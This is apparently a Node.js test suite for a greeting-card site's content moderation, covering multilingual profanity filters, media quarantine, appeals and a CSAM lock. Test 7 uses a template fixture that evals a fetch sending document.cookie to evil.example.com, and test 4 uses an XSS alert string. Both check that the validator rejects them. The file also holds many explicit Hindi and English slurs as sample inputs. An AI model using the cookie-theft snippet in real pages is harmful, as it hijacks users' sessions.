/**
 * WishMagic Automated Test Suite: Part 47 — Complete Content Moderation & Quarantine System
 * =========================================================================================
 * Mandatory verification suite covering:
 * 1. Migration 0035 & D1 Schema Integrity
 * 2. Hindi (Devanagari), Roman Hindi/Hinglish, and English Abusive Text & Obfuscation Detection
 * 3. Context-Aware False-Positive Protection (Harmless Words & Celebration Wishes)
 * 4. Image Moderation (Explicit, Harmless, Ambiguous, Disguised Magic Bytes, OCR Embedded Text)
 * 5. Video & Audio Moderation, Keyframes, Transcripts & Scan Failure Quarantine
 * 6. External Moderation Provider Timeout & Fail-Closed Quarantine
 * 7. Direct API Bypass Attempts & Unapproved Media Publish Blocking
 * 8. Quarantine -> Admin Manual Review (Approve / Reject / Recheck) & Appeals Workflow
 * 9. Repeat Violations Auto-Restriction & CSAM Zero-Exposure Legal Compliance Lock
 * 10. Template HTML/JS Security Validation & Regressions (Payments, VIP, Templates, Wish Links)
 */

import { test, describe, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { DatabaseSync, cleanupSqliteBridge } from '../scripts/sqlite-compat.js';
import {
  MODERATION_STATUS,
  MODERATION_CATEGORIES,
  moderateTextContent,
  moderateWishPayloadFields,
  moderateImageAsset,
  moderateAudioVideoAsset,
  validateTemplateSecurityAndModeration,
  resetModerationRateLimits
} from '../src/content-moderation-engine.js';
import { createZipFromFiles, executeB2TemplateIngestPipeline } from '../src/template-ingest-pipeline.js';
import worker from '../src/worker.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const ROOT_DIR = path.resolve(__dirname, '..');

function createTestD1Adapter(sqliteDb) {
  return {
    prepare(sql) {
      return {
        bind(...params) {
          return {
            async run() {
              const stmt = sqliteDb.prepare(sql);
              const info = stmt.run(...params);
              return { success: true, meta: { changes: info.changes } };
            },
            async first() {
              const stmt = sqliteDb.prepare(sql);
              return stmt.get(...params) || null;
            },
            async all() {
              const stmt = sqliteDb.prepare(sql);
              const results = stmt.all(...params);
              return { success: true, results };
            }
          };
        },
        async run() {
          const stmt = sqliteDb.prepare(sql);
          const info = stmt.run();
          return { success: true, meta: { changes: info.changes } };
        },
        async first() {
          const stmt = sqliteDb.prepare(sql);
          return stmt.get() || null;
        },
        async all() {
          const stmt = sqliteDb.prepare(sql);
          const results = stmt.all();
          return { success: true, results };
        }
      };
    },
    async batch(statements) {
      const out = [];
      for (const s of statements) {
        out.push(await s.run());
      }
      return out;
    }
  };
}

// Helper to build a valid PNG binary with optional embedded tEXt chunk (for OCR/embedded text testing)
function buildTestPngBytes(textChunk = '') {
  // 1x1 valid PNG header + IHDR + IDAT + optional tEXt + IEND
  const basePngB64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
  const baseBytes = Buffer.from(basePngB64, 'base64');
  if (!textChunk) return new Uint8Array(baseBytes);

  // Inject a PNG tEXt chunk right before IEND (last 12 bytes)
  const payload = Buffer.from(`Comment\0${textChunk}`, 'utf8');
  const lenBuf = Buffer.alloc(4);
  lenBuf.writeUInt32BE(payload.length, 0);
  const typeBuf = Buffer.from('tEXt', 'ascii');
  const crcBuf = Buffer.alloc(4, 0);
  const iendOffset = baseBytes.length - 12;
  const combined = Buffer.concat([
    baseBytes.subarray(0, iendOffset),
    lenBuf,
    typeBuf,
    payload,
    crcBuf,
    baseBytes.subarray(iendOffset)
  ]);
  return new Uint8Array(combined);
}

// Helper to build a valid MP3 binary buffer with optional ID3/metadata text
function buildTestMp3Bytes(extraText = 'Clean Celebration Melody') {
  const header = Buffer.from([0x49, 0x44, 0x33, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20]);
  const frameSync = Buffer.from([0xFF, 0xFB, 0x90, 0x64, 0x00, 0x00, 0x00, 0x00]);
  const textBuf = Buffer.from(extraText.padEnd(64, ' '), 'utf8');
  return new Uint8Array(Buffer.concat([header, textBuf, frameSync]));
}

// Helper to build a valid MP4 binary buffer with ftyp header and optional metadata text
function buildTestMp4Bytes(extraText = 'Clean Birthday Video Clip') {
  const ftyp = Buffer.from([
    0x00, 0x00, 0x00, 0x18,
    0x66, 0x74, 0x79, 0x70, // 'ftyp'
    0x6D, 0x70, 0x34, 0x32, // 'mp42'
    0x00, 0x00, 0x00, 0x00,
    0x6D, 0x70, 0x34, 0x32,
    0x69, 0x73, 0x6F, 0x6D
  ]);
  const udta = Buffer.from(extraText.padEnd(64, ' '), 'utf8');
  return new Uint8Array(Buffer.concat([ftyp, udta]));
}

describe('WishMagic Part 47: Complete Production Content Moderation System Suite', () => {

  test('1. Migration 0035 & D1 Schema Parity: verifies moderation tables, columns, and Admin UI existence', () => {
    const migPath = path.join(ROOT_DIR, 'migrations', '0035_part47_content_moderation_system.sql');
    assert.ok(fs.existsSync(migPath), 'Migration 0035_part47_content_moderation_system.sql must exist');

    const migSql = fs.readFileSync(migPath, 'utf8');
    assert.ok(migSql.includes('CREATE TABLE IF NOT EXISTS moderation_items'), 'moderation_items table required');
    assert.ok(migSql.includes('CREATE TABLE IF NOT EXISTS moderation_scans'), 'moderation_scans table required');
    assert.ok(migSql.includes('CREATE TABLE IF NOT EXISTS moderation_violations'), 'moderation_violations table required');
    assert.ok(migSql.includes('CREATE TABLE IF NOT EXISTS moderation_appeals'), 'moderation_appeals table required');
    assert.ok(migSql.includes('CREATE TABLE IF NOT EXISTS csam_compliance_incidents'), 'csam_compliance_incidents table required');

    const adminHtml = fs.readFileSync(path.join(ROOT_DIR, 'public', 'admin-moderation.html'), 'utf8');
    assert.ok(adminHtml.includes('moderation-items-body'), 'Admin moderation page must render quarantine items queue');
    assert.ok(adminHtml.includes('appeals-table-body'), 'Admin moderation page must render appeals queue');
    assert.ok(adminHtml.includes('restricted-users-body'), 'Admin moderation page must render restricted users section');
    assert.ok(adminHtml.includes('SEALED FOR LEGAL COMPLIANCE'), 'Admin moderation page must enforce CSAM zero-exposure safeguard');
  });

  test('2. Multilingual Abusive Text Moderation: blocks Hindi Devanagari, Hinglish, English & obfuscated profanity', () => {
    const abusiveSamples = [
      // Hindi Devanagari
      { text: 'तू बहुत बड़ा चूतिया और मादरचोद है', expectedCat: MODERATION_CATEGORIES.PROFANITY_HINDI },
      { text: 'अबे बहनचोद भोसड़ीके यहां मत आ', expectedCat: MODERATION_CATEGORIES.PROFANITY_HINDI },
      { text: 'रंडी और हरामजादे कुत्ते की औलाद', expectedCat: MODERATION_CATEGORIES.PROFANITY_HINDI },
      { text: 'अपनी नंगी फोटो भेज', expectedCat: MODERATION_CATEGORIES.NUDITY_PORNOGRAPHY },
      // Roman Hindi / Hinglish
      { text: 'Happy birthday bhenchod madarchod', expectedCat: MODERATION_CATEGORIES.PROFANITY_HINGLISH },
      { text: 'Tu ek number ka chutiya aur bhosdike hai', expectedCat: MODERATION_CATEGORIES.PROFANITY_HINGLISH },
      { text: 'Abe bsdk gandu lauda le le', expectedCat: MODERATION_CATEGORIES.PROFANITY_HINGLISH },
      { text: 'Teri maa ki chut haramkhor', expectedCat: MODERATION_CATEGORIES.PROFANITY_HINGLISH },
      // Obfuscated Hinglish & English (dots, spaces, leet, repeated chars, asterisks)
      { text: 'You are a b.h.e.n.c.h.o.d and c_h_u_t_i_y_a', expectedCat: MODERATION_CATEGORIES.PROFANITY_HINGLISH },
      { text: 'Hey chuuuuutiyaaa m@d@rch0d', expectedCat: MODERATION_CATEGORIES.PROFANITY_HINGLISH },
      { text: 'What the f u c k you f@ck1ng b!tch', expectedCat: MODERATION_CATEGORIES.PROFANITY_ENGLISH },
      { text: 'Go f**k yourself you a**hole', expectedCat: MODERATION_CATEGORIES.PROFANITY_ENGLISH },
      { text: 'Send nudes and watch pornhub sex tape', expectedCat: MODERATION_CATEGORIES.NUDITY_PORNOGRAPHY },
      { text: 'Kill yourself right now, I will kill you', expectedCat: MODERATION_CATEGORIES.TARGETED_HARASSMENT }
    ];

    for (const sample of abusiveSamples) {
      const res = moderateTextContent(sample.text, { fieldName: 'custom_message' });
      assert.equal(res.allowed, false, `Should block abusive text: "${sample.text}"`);
      assert.equal(res.status, MODERATION_STATUS.REJECTED);
      assert.ok(res.categories.includes(sample.expectedCat), `Expected category ${sample.expectedCat} for "${sample.text}", got ${res.categories.join(',')}`);
    }
  });

  test('3. Context-Aware False Positive Prevention: allows harmless words, Scunthorpe cases & warm birthday wishes', () => {
    const harmlessSamples = [
      'Happy 21st Birthday Priya! Wishing you a magical year ahead filled with endless love, laughter, and joy!',
      'Happy Anniversary my darling wife Anandi! From Gandhinagar to Assam, every moment with you is a classic blessing.',
      'Congratulations on passing your class with distinction and summa cum laude honors!',
      'Let us celebrate with passion fruit cocktails, butterscotch cake, and a glass of sparkling grape juice in Scunthorpe.',
      'Reading Charles Dickens classics with Randhir Randhawa and Chota Bheem in Disneyland and Wonderland.',
      'You are the cutest best friend! Thank you for your compassionate assistance and warm hugs.',
      'गांधीनगर में सुगंधा और आनंद को जन्मदिन की हार्दिक शुभकामनाएं और बहुत सारा प्यार!'
    ];

    for (const text of harmlessSamples) {
      const res = moderateTextContent(text, { fieldName: 'custom_message' });
      assert.equal(res.allowed, true, `Harmless text should NOT be blocked: "${text}" (reason: ${res.reason})`);
      assert.equal(res.status, MODERATION_STATUS.APPROVED);
      assert.equal(res.categories.length, 0);
    }
  });

  test('4. Image Content Moderation: harmless, explicit, ambiguous, disguised magic-bytes & OCR text-in-image', async () => {
    // A. Harmless image passes
    const cleanPng = buildTestPngBytes('Happy Birthday Celebration Memory');
    const cleanRes = await moderateImageAsset(cleanPng, { filename: 'memory.png' });
    assert.equal(cleanRes.allowed, true, 'Clean PNG image must be approved');
    assert.equal(cleanRes.status, MODERATION_STATUS.APPROVED);
    assert.equal(cleanRes.isQuarantined, false);

    // B. Disguised script/HTML pretending to be .jpg is rejected by magic bytes
    const fakeJpg = new TextEncoder().encode('<html><script>alert(document.cookie)</script></html>');
    const fakeRes = await moderateImageAsset(fakeJpg, { filename: 'avatar.jpg' });
    assert.equal(fakeRes.allowed, false, 'Disguised HTML with .jpg extension must be rejected');
    assert.equal(fakeRes.status, MODERATION_STATUS.REJECTED);
    assert.ok(fakeRes.categories.includes('IMAGE_SIGNATURE_MISMATCH'));

    // C. Image containing embedded abusive Hindi/Hinglish/English OCR text is blocked
    const abusiveOcrPng = buildTestPngBytes('Tu bhenchod madarchod hai fuck you');
    const ocrRes = await moderateImageAsset(abusiveOcrPng, { filename: 'meme.png' });
    assert.equal(ocrRes.allowed, false, 'Image with abusive OCR/embedded text must be blocked');
    assert.equal(ocrRes.status, MODERATION_STATUS.REJECTED);
    assert.ok(ocrRes.categories.includes(MODERATION_CATEGORIES.OCR_ABUSIVE_TEXT));

    // D. Explicit image (high skin-tone pixel exposure >= 65%) is rejected
    const explicitPixels = new Uint8Array(100 * 4);
    for (let i = 0; i < 100; i++) {
      // Skin-tone RGB (210, 140, 110)
      explicitPixels[i * 4] = 210;
      explicitPixels[i * 4 + 1] = 140;
      explicitPixels[i * 4 + 2] = 110;
      explicitPixels[i * 4 + 3] = 255;
    }
    const explicitRes = await moderateImageAsset(cleanPng, {
      filename: 'explicit.png',
      rawPixels: explicitPixels
    });
    assert.equal(explicitRes.allowed, false, 'Explicit nudity image must be rejected');
    assert.equal(explicitRes.status, MODERATION_STATUS.REJECTED);
    assert.equal(explicitRes.isQuarantined, true);
    assert.ok(explicitRes.categories.includes(MODERATION_CATEGORIES.NUDITY_PORNOGRAPHY));

    // E. Ambiguous image (~50% skin-tone pixel exposure) is placed in PENDING_REVIEW quarantine (not auto-approved!)
    const ambiguousPixels = new Uint8Array(100 * 4);
    for (let i = 0; i < 100; i++) {
      if (i < 50) {
        ambiguousPixels[i * 4] = 210;
        ambiguousPixels[i * 4 + 1] = 140;
        ambiguousPixels[i * 4 + 2] = 110;
      } else {
        ambiguousPixels[i * 4] = 20;
        ambiguousPixels[i * 4 + 1] = 80;
        ambiguousPixels[i * 4 + 2] = 200;
      }
      ambiguousPixels[i * 4 + 3] = 255;
    }
    const ambigRes = await moderateImageAsset(cleanPng, {
      filename: 'beach.png',
      rawPixels: ambiguousPixels
    });
    assert.equal(ambigRes.allowed, false, 'Ambiguous image must not be auto-approved');
    assert.equal(ambigRes.status, MODERATION_STATUS.PENDING_REVIEW);
    assert.equal(ambigRes.isQuarantined, true);
  });

  test('5. Video & Audio Moderation: clean media, explicit frames/transcripts, scan failures & provider timeout', async () => {
    // A. Clean MP4 video & MP3 audio
    const cleanMp4 = buildTestMp4Bytes('Happy Birthday Celebration Video');
    const vidCleanRes = await moderateAudioVideoAsset(cleanMp4, { mediaKind: 'video', filename: 'intro.mp4' });
    assert.equal(vidCleanRes.allowed, true);
    assert.equal(vidCleanRes.status, MODERATION_STATUS.APPROVED);

    const cleanMp3 = buildTestMp3Bytes('Happy Birthday Instrumental');
    const audCleanRes = await moderateAudioVideoAsset(cleanMp3, { mediaKind: 'audio', filename: 'bgm.mp3' });
    assert.equal(audCleanRes.allowed, true);
    assert.equal(audCleanRes.status, MODERATION_STATUS.APPROVED);

    // B. Video with explicit keyframe is rejected
    const explicitFrame = buildTestPngBytes('nsfw_explicit pornographic_content');
    const badFrameVidRes = await moderateAudioVideoAsset(cleanMp4, {
      mediaKind: 'video',
      filename: 'greeting.mp4',
      frames: [explicitFrame]
    });
    assert.equal(badFrameVidRes.allowed, false);
    assert.equal(badFrameVidRes.status, MODERATION_STATUS.REJECTED);
    assert.ok(badFrameVidRes.categories.includes(MODERATION_CATEGORIES.AUDIO_VIDEO_EXPLICIT));

    // C. Audio with abusive Hinglish/Hindi transcript is rejected
    const badAudioRes = await moderateAudioVideoAsset(cleanMp3, {
      mediaKind: 'audio',
      filename: 'voice.mp3',
      transcript: 'Abe bhenchod madarchod teri maa ki chut'
    });
    assert.equal(badAudioRes.allowed, false);
    assert.equal(badAudioRes.status, MODERATION_STATUS.REJECTED);

    // D. Video/Audio scan failure is held in SCAN_FAILED quarantine (never auto-approved)
    const corruptedMp4 = buildTestMp4Bytes('corrupted_video_stream frame_decode_error');
    const failScanRes = await moderateAudioVideoAsset(corruptedMp4, {
      mediaKind: 'video',
      filename: 'corrupt.mp4'
    });
    assert.equal(failScanRes.allowed, false, 'Scan failure must NOT auto-approve');
    assert.equal(failScanRes.status, MODERATION_STATUS.SCAN_FAILED);
    assert.equal(failScanRes.isQuarantined, true);

    // E. Moderation Provider Timeout -> Fail-Closed SCAN_FAILED
    const slowFetch = async (_url, init) => {
      return new Promise((resolve, reject) => {
        const timer = setTimeout(() => resolve(new Response('{}', { status: 200 })), 500);
        if (init?.signal) {
          init.signal.addEventListener('abort', () => {
            clearTimeout(timer);
            const abortErr = new Error('The operation was aborted');
            abortErr.name = 'AbortError';
            reject(abortErr);
          });
        }
      });
    };

    const timeoutRes = await moderateImageAsset(buildTestPngBytes('clean'), {
      filename: 'timeout.png',
      env: {
        MODERATION_API_URL: 'https://moderation.example.com/scan',
        MODERATION_TIMEOUT_MS: '30'
      },
      fetchFn: slowFetch
    });
    assert.equal(timeoutRes.allowed, false, 'Timed-out provider scan must NEVER auto-approve');
    assert.equal(timeoutRes.status, MODERATION_STATUS.SCAN_FAILED);
    assert.equal(timeoutRes.isQuarantined, true);
    assert.equal(timeoutRes.errorCode, 'PROVIDER_TIMEOUT');
  });

  test('6. End-to-End Worker API Enforcement: Direct Bypass Rejection, Quarantine -> Approval/Rejection, Appeals, Repeat Offender Restriction & CSAM Lock', async () => {
    resetModerationRateLimits();
    const sqliteDb = new DatabaseSync(':memory:');
    const setupSql = fs.readFileSync(path.join(ROOT_DIR, 'd1_setup.sql'), 'utf8');
    sqliteDb.exec(setupSql);
    const db = createTestD1Adapter(sqliteDb);

    // Seed an active creator user and an admin user in D1 + sessions
    const nowIso = new Date().toISOString();
    const futureIso = String(Date.now() + 86400000);
    sqliteDb.exec(`
      INSERT OR REPLACE INTO users (id, email, display_name, role, plan, is_premium, status, moderation_strikes, moderation_restricted, created_at, updated_at)
      VALUES
        ('usr_creator_1', 'creator1@test.com', 'Creator One', 'creator', 'Free', 0, 'active', 0, 0, '${nowIso}', '${nowIso}'),
        ('usr_offender_2', 'offender2@test.com', 'Repeat Offender', 'creator', 'Free', 0, 'active', 0, 0, '${nowIso}', '${nowIso}'),
        ('usr_admin_999', 'ankit.babusaini@gmail.com', 'Ankit Admin', 'admin', 'VIP', 1, 'active', 0, 0, '${nowIso}', '${nowIso}');

      INSERT OR REPLACE INTO sessions (id, user_id, token, expires_at, created_at)
      VALUES
        ('sess_creator_1', 'usr_creator_1', 'tok_creator_1', '${futureIso}', '${nowIso}'),
        ('sess_offender_2', 'usr_offender_2', 'tok_offender_2', '${futureIso}', '${nowIso}'),
        ('sess_admin_999', 'usr_admin_999', 'tok_admin_999', '${futureIso}', '${nowIso}');
    `);

    const env = {
      DB: db,
      IMGBB_API_KEY: 'test_imgbb_key_123'
    };

    const creatorHeaders = {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer tok_creator_1',
      'Origin': 'https://wishmagic.live'
    };
    const offenderHeaders = {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer tok_offender_2',
      'Origin': 'https://wishmagic.live'
    };
    const adminHeaders = {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer tok_admin_999',
      'Origin': 'https://wishmagic.live'
    };

    // 6A. Abusive Wish Creation is Blocked Server-Side (422 MODERATION_REJECTED)
    const badWishReq = new Request('https://wishmagic.live/api/wishes', {
      method: 'POST',
      headers: creatorHeaders,
      body: JSON.stringify({
        templateId: 'tpl_glitter_birthday',
        customData: {
          recipient_name: 'Priya',
          custom_message: 'Happy birthday bhenchod madarchod तू चूतिया है'
        }
      })
    });
    const badWishRes = await worker.fetch(badWishReq, env);
    assert.equal(badWishRes.status, 422, 'Abusive wish creation must be blocked with 422');
    const badWishJson = await badWishRes.json();
    assert.equal(badWishJson.error.code, 'MODERATION_REJECTED');

    // 6B. Direct API Bypass Attempt is Blocked with 403 MODERATION_BYPASS_REJECTED
    const bypassReq = new Request('https://wishmagic.live/api/wishes', {
      method: 'POST',
      headers: creatorHeaders,
      body: JSON.stringify({
        templateId: 'tpl_glitter_birthday',
        moderationStatus: 'APPROVED',
        bypassModeration: true,
        customData: {
          recipient_name: 'Priya',
          custom_message: 'Happy birthday!'
        }
      })
    });
    const bypassRes = await worker.fetch(bypassReq, env);
    assert.equal(bypassRes.status, 403, 'Direct API bypass flag must be rejected with 403');
    const bypassJson = await bypassRes.json();
    assert.equal(bypassJson.error.code, 'MODERATION_BYPASS_REJECTED');

    // 6C. Clean Draft Wish Creation Succeeds (Regression check)
    const cleanDraftReq = new Request('https://wishmagic.live/api/wishes', {
      method: 'POST',
      headers: creatorHeaders,
      body: JSON.stringify({
        templateId: 'tpl_glitter_birthday',
        status: 'draft',
        isDraft: true,
        customData: {
          recipient_name: 'Priya Sharma',
          sender_name: 'Rahul',
          custom_message: 'Wishing you the happiest birthday filled with classic cocktails and joy in Gandhinagar!',
          isDraft: true
        }
      })
    });
    const cleanDraftRes = await worker.fetch(cleanDraftReq, env);
    assert.equal(cleanDraftRes.status, 201, 'Clean draft wish creation must succeed with 201');
    const cleanDraftJson = await cleanDraftRes.json();
    const wishId = cleanDraftJson.wishId;
    assert.ok(wishId, 'wishId must be returned');

    // 6D. Upload Ambiguous Image to Wish -> Held in Private Quarantine (422 MEDIA_QUARANTINED_PENDING_REVIEW)
    const ambigPng = buildTestPngBytes('nsfw_ambiguous borderline_nudity');
    const ambigB64 = Buffer.from(ambigPng).toString('base64');
    const mediaUploadReq = new Request(`https://wishmagic.live/api/wishes/${wishId}/media`, {
      method: 'POST',
      headers: creatorHeaders,
      body: JSON.stringify({
        fieldKey: 'photo_1',
        filename: 'ambiguous_beach.png',
        fileData: ambigB64
      })
    });
    const mediaUploadRes = await worker.fetch(mediaUploadReq, env);
    assert.equal(mediaUploadRes.status, 422, 'Ambiguous image must be held in quarantine');
    const mediaUploadJson = await mediaUploadRes.json();
    assert.equal(mediaUploadJson.error.code, 'MEDIA_QUARANTINED_PENDING_REVIEW');
    const quarantinedMediaId = mediaUploadJson.error.details.mediaId;
    const moderationItemId = mediaUploadJson.error.details.moderationItemId;
    assert.ok(quarantinedMediaId);
    assert.ok(moderationItemId);

    // 6E. Streaming Quarantined Media via /api/media/stream is Blocked (403 MEDIA_QUARANTINED)
    const streamBlockedReq = new Request(`https://wishmagic.live/api/media/stream?id=${quarantinedMediaId}`, {
      method: 'GET'
    });
    const streamBlockedRes = await worker.fetch(streamBlockedReq, env);
    assert.equal(streamBlockedRes.status, 403, 'Quarantined media must not be publicly streamable');

    // 6F. Publishing Wish While Media is Quarantined is Blocked (422 MEDIA_MODERATION_BLOCKED)
    const publishBlockedReq = new Request(`https://wishmagic.live/api/wishes/${wishId}/publish`, {
      method: 'POST',
      headers: creatorHeaders
    });
    const publishBlockedRes = await worker.fetch(publishBlockedReq, env);
    assert.equal(publishBlockedRes.status, 422, 'Publishing wish with quarantined media must be blocked');
    const publishBlockedJson = await publishBlockedRes.json();
    assert.equal(publishBlockedJson.error.code, 'MEDIA_MODERATION_BLOCKED');

    // 6G. User Submits Appeal for Quarantined Item -> Admin Approves Appeal -> Wish Publishing Now Succeeds!
    const appealReq = new Request('https://wishmagic.live/api/moderation/appeals', {
      method: 'POST',
      headers: creatorHeaders,
      body: JSON.stringify({
        moderationItemId,
        reason: 'This is a harmless family birthday photo at the beach.'
      })
    });
    const appealRes = await worker.fetch(appealReq, env);
    assert.equal(appealRes.status, 201, 'User appeal submission must succeed');
    const appealJson = await appealRes.json();
    const appealId = appealJson.appealId;

    // Admin resolves appeal as APPROVED
    const resolveAppealReq = new Request(`https://wishmagic.live/api/admin/moderation/appeals/${appealId}/resolve`, {
      method: 'POST',
      headers: adminHeaders,
      body: JSON.stringify({
        decision: 'approve',
        notes: 'Verified harmless family photo; releasing from quarantine.'
      })
    });
    const resolveAppealRes = await worker.fetch(resolveAppealReq, env);
    assert.equal(resolveAppealRes.status, 200, 'Admin appeal approval must succeed');

    // Now publishing the wish succeeds!
    const publishOkReq = new Request(`https://wishmagic.live/api/wishes/${wishId}/publish`, {
      method: 'POST',
      headers: creatorHeaders
    });
    const publishOkRes = await worker.fetch(publishOkReq, env);
    assert.equal(publishOkRes.status, 200, 'Wish publish must succeed after quarantined media is approved');
    const publishOkJson = await publishOkRes.json();
    assert.equal(publishOkJson.published, true);

    // 6H. Repeated Violations (3 Strikes) Automatically Restrict Offender Account
    for (let strike = 1; strike <= 3; strike++) {
      const vReq = new Request('https://wishmagic.live/api/wishes', {
        method: 'POST',
        headers: offenderHeaders,
        body: JSON.stringify({
          templateId: 'tpl_glitter_birthday',
          customData: {
            recipient_name: 'Target',
            custom_message: `Abusive strike ${strike}: madarchod bhenchod fuck you`
          }
        })
      });
      const vRes = await worker.fetch(vReq, env);
      assert.equal(vRes.status, 422);
    }

    // 4th attempt by offender even with clean text is now blocked with 403 ACCOUNT_MODERATION_RESTRICTED
    const restrictedAttemptReq = new Request('https://wishmagic.live/api/wishes', {
      method: 'POST',
      headers: offenderHeaders,
      body: JSON.stringify({
        templateId: 'tpl_glitter_birthday',
        customData: {
          recipient_name: 'Friend',
          custom_message: 'Happy Birthday!'
        }
      })
    });
    const restrictedAttemptRes = await worker.fetch(restrictedAttemptReq, env);
    assert.equal(restrictedAttemptRes.status, 403, 'Restricted repeat offender must be blocked with 403');
    const restrictedAttemptJson = await restrictedAttemptRes.json();
    assert.equal(restrictedAttemptJson.error.code, 'ACCOUNT_MODERATION_RESTRICTED');

    // 6I. CSAM Detection -> Immediate Zero-Exposure Lock (451), No Preview in Admin Queue, Cannot Be Unlocked
    const csamPng = buildTestPngBytes('csam_test_vector child sexual abuse');
    const csamUploadReq = new Request('https://wishmagic.live/api/media/upload', {
      method: 'POST',
      headers: creatorHeaders,
      body: JSON.stringify({
        filename: 'suspect.png',
        type: 'image',
        fileData: Buffer.from(csamPng).toString('base64')
      })
    });
    const csamUploadRes = await worker.fetch(csamUploadReq, env);
    assert.equal(csamUploadRes.status, 451, 'Suspected CSAM upload must return 451 CSAM_COMPLIANCE_LOCK');
    const csamUploadJson = await csamUploadRes.json();
    assert.equal(csamUploadJson.error.code, 'CSAM_COMPLIANCE_LOCK');
    const csamItemId = csamUploadJson.error.details.moderationItemId;

    // Verify Admin Moderation Queue NEVER exposes preview/public URLs for CSAM_LOCKED items
    const queueReq = new Request('https://wishmagic.live/api/admin/moderation/queue', {
      method: 'GET',
      headers: adminHeaders
    });
    const queueRes = await worker.fetch(queueReq, env);
    assert.equal(queueRes.status, 200);
    const queueJson = await queueRes.json();
    const csamQueueItem = queueJson.items.find(i => i.id === csamItemId);
    assert.ok(csamQueueItem, 'CSAM item must be tracked in moderation queue');
    assert.equal(csamQueueItem.status, MODERATION_STATUS.CSAM_LOCKED);
    assert.equal(csamQueueItem.isCsamLocked, true);
    assert.equal(csamQueueItem.previewAllowed, false, 'CSAM item must NEVER allow preview in UI');
    assert.equal(csamQueueItem.approvedPublicUrl, null, 'CSAM item must NEVER expose public URL');
    assert.equal(csamQueueItem.thumbnailUrl, null, 'CSAM item must NEVER expose thumbnail URL');

    // Verify even Admin cannot approve/unlock a CSAM_LOCKED item
    const unlockAttemptReq = new Request(`https://wishmagic.live/api/admin/moderation/items/${csamItemId}/review`, {
      method: 'POST',
      headers: adminHeaders,
      body: JSON.stringify({ action: 'approve', notes: 'Try unlock' })
    });
    const unlockAttemptRes = await worker.fetch(unlockAttemptReq, env);
    assert.equal(unlockAttemptRes.status, 403, 'Unlocking CSAM_LOCKED item must be forbidden');
  });

  test('7. Template HTML/JS Security Validation & Content Moderation Enforcement', async () => {
    // A. Template containing eval() and document.cookie exfiltration is rejected by security validator
    const maliciousFiles = new Map([
      ['index.html', { content: new TextEncoder().encode('<!DOCTYPE html><html><body><h1 data-wm-field="recipient_name">Hi</h1><script src="js/template.js"></script></body></html>') }],
      ['js/template.js', { content: new TextEncoder().encode('eval("fetch(\'https://evil.example.com/?c=\' + document.cookie)");') }]
    ]);
    const secCheck = await validateTemplateSecurityAndModeration(maliciousFiles, {
      template: { name: 'Malicious Template', description: 'Safe description' }
    });
    assert.equal(secCheck.valid, false);
    assert.equal(secCheck.securityValid, false, 'Template with eval() and document.cookie must fail security check');
    assert.ok(secCheck.securityIssues.some(i => i.code === 'DANGEROUS_EVAL'));
    assert.ok(secCheck.securityIssues.some(i => i.code === 'COOKIE_EXFILTRATION'));

    // B. Template ZIP with abusive default text is rejected by executeB2TemplateIngestPipeline
    const sqliteDb = new DatabaseSync(':memory:');
    sqliteDb.exec(fs.readFileSync(path.join(ROOT_DIR, 'd1_setup.sql'), 'utf8'));
    const db = createTestD1Adapter(sqliteDb);

    const abusiveZipBytes = await createZipFromFiles([
      {
        path: 'wishmagic.json',
        content: JSON.stringify({
          $schema: 'wishmagic-template',
          schemaVersion: '1.0.0',
          template: {
            id: 'abusive-tpl',
            name: 'Abusive Template',
            description: 'Clean description',
            category: 'birthday',
            entry: 'index.html'
          },
          fields: [
            {
              id: 'recipient_name',
              type: 'text',
              label: 'Recipient Name',
              defaultValue: 'Priya',
              binding: { target: 'text', selector: "[data-wm-field='recipient_name']" }
            }
          ]
        })
      },
      {
        path: 'index.html',
        content: '<!DOCTYPE html><html><body><h1 data-wm-field="recipient_name">Priya</h1><p>Happy birthday bhenchod madarchod</p></body></html>'
      }
    ]);

    const mockB2 = {
      async putObject({ key }) {
        return { key, fileId: 'f_1', playbackUrl: `https://cdn.example.com/${key}` };
      },
      async deleteObject() { return true; }
    };

    const ingestRes = await executeB2TemplateIngestPipeline({
      zipBuffer: abusiveZipBytes,
      templateMetadata: { name: 'Abusive Template', category: 'birthday' },
      db,
      storageProvider: mockB2,
      env: {}
    });

    assert.equal(ingestRes.success, false, 'Template ZIP with abusive content must fail ingestion');
    assert.equal(ingestRes.code, 'TEMPLATE_MODERATION_REJECTED');
  });

  after(() => {
    cleanupSqliteBridge();
  });
});
